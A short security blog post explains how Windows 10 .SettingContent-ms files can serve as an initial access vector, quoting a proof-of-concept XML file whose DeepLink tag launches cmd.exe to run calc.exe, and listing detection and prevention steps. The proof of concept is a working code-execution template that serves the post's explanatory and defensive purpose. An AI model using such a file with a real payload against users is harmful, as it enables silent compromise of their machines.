---
title: "Understandings on .SettingContent-ms as aื Initial Access Vector"
date: 2018-12-29T13:27:00+07:00
author: "P. Boonyakarn"
description: ".SettingContent-ms is a format of file that allow a user to create \"shortcuts\" to options available on Windows 10 setting pages"
---

## Technical Specification

- `.SettingContent-ms` is a format of file that allow a user to create "shortcuts" to options available on Windows 10 setting pages
- `.SettingContent-ms` was introduced in Windows 10 and can be constructed in XML syntax
- The target application to be launched with `.SettingContent-ms` can be specified on `<DeepLink>` tag. The modified `.SettingContent-ms` will execute program directly without intermediate program.
- Poisoned `.SettingContent-ms` files can be delivered via HTTP/S, execution without notification and warning to users.
- Max character size allowed on `<DeepLink>` tag is 517 characeters.

```xml
<!-- From https://gist.github.com/enigma0x3/b948b81717fd6b72e0a4baca033e07f8 -->
<?xml version="1.0" encoding="UTF-8"?>
<PCSettings>
  <SearchableContent xmlns="http://schemas.microsoft.com/Search/2013/SettingContent">
    <ApplicationInformation>
      <AppID>windows.immersivecontrolpanel_cw5n1h2txyewy!microsoft.windows.immersivecontrolpanel</AppID>
      <DeepLink>%windir%\system32\cmd.exe /c calc.exe</DeepLink>
      <Icon>%windir%\system32\control.exe</Icon>
    </ApplicationInformation>
    <SettingIdentity>
      <PageID></PageID>
      <HostID>host_id</HostID>
    </SettingIdentity>
    <SettingInformation>
      <Description>@shell32.dll,-4161</Description>
      <Keywords>@shell32.dll,-4161</Keywords>
    </SettingInformation>
  </SearchableContent>
</PCSettings>
```

## Detection/Prevention

- Monitor an execution of child processes from Office applications
- Look for existing of `.SettingContent-ms outside `C:\Windows\ImmersiveControlPanel`
- Examine command logging is enabled 
- Blocking `.SettingContent-ms` on the perimeter
- Changing the file association types for `.SettingContent-ms` to notepad or something different that does not execute the code

## References

- [The Tale of SettingContent-ms Files](https://posts.specterops.io/the-tale-of-settingcontent-ms-files-f1ea253e4d39)
- [Weaponizing .SettingContent-ms Extensions for Code Execution](https://www.trustedsec.com/2018/06/weaponizing-settingcontent/)